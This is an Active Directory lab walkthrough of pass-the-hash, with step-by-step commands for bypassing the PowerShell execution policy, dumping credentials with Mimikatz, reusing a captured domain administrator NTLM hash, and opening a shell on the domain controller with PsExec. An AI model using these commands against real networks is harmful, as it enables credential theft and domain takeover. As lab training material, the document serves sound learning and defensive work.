# Active Directory LAB - Passing the hash - v04

## Passing the hash

By: CyberSec

**Tools:** 

Invoke-Mimikatz -  [https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)

PsExec.exe - [https://learn.microsoft.com/en-us/sysinternals/downloads/psexec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)

Syntax for passing the hash with Invoke-Mimikatz.ps1: 

Command:

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:csl.local /ntlm:<ntlmhash> /run:powershell.exe"

```

### Step 1:

Run Command prompt as local administrator 

![Untitled](Active%20Directory%20LAB%20-%20Passing%20the%20hash%20-%20v04%20bc76fa23a2294ad68108a617ea36d3af/Untitled.png)

### Step 2:

Start Powershell and bypass execution policy.

**Command:**

```powershell
powershell -ep bypass
```

![Untitled](Active%20Directory%20LAB%20-%20Passing%20the%20hash%20-%20v04%20bc76fa23a2294ad68108a617ea36d3af/Untitled%201.png)

### Step 3:

Import Mimikatz.ps1 into the running powershell session

**Command:**

```powershell
. .\Invoke-Mimikatz.ps1
```

### Step 4:

With local administrator privileges on any host in the domain, we can download and use Mimikatz to extract logon password hash. The below command usually shows recently logged on user and computer credentials.

**Command:**

```powershell

. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
```

The below hash was provided for us to reuse it against another target machine.

![Untitled](Active%20Directory%20LAB%20-%20Passing%20the%20hash%20-%20v04%20bc76fa23a2294ad68108a617ea36d3af/Untitled%202.png)

![Untitled](Active%20Directory%20LAB%20-%20Passing%20the%20hash%20-%20v04%20bc76fa23a2294ad68108a617ea36d3af/Untitled%203.png)

```powershell
Domain Administrator NTLM Hash: 9906ed8e920cc9870cf919af7db14875
```

Since, we were able to get the Domain Administrators hash, we can attempt to pass the hash in order to access the domain controller without knowing the plaintext password.

### Step 5:

Start a new Powershell session with local administrator’s privileges and use **invoke-mimikatz.ps1** to pass the hash to move laterally:

![Untitled](Active%20Directory%20LAB%20-%20Passing%20the%20hash%20-%20v04%20bc76fa23a2294ad68108a617ea36d3af/Untitled%204.png)

**Command:**

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:csl.local /ntlm:9906ed8e920cc9870cf919af7db14875 /run:powershell.exe"'
```

![Untitled](Active%20Directory%20LAB%20-%20Passing%20the%20hash%20-%20v04%20bc76fa23a2294ad68108a617ea36d3af/Untitled%205.png)

A new powershell session is started once the above command is issued.

### **Step 6:**

Finally, can use PsExec.exe 

**Command:** 

```powershell
. .\PsExec.exe -Accepteula \\dc01.csl.local cmd
```

![Untitled](Active%20Directory%20LAB%20-%20Passing%20the%20hash%20-%20v04%20bc76fa23a2294ad68108a617ea36d3af/Untitled%206.png)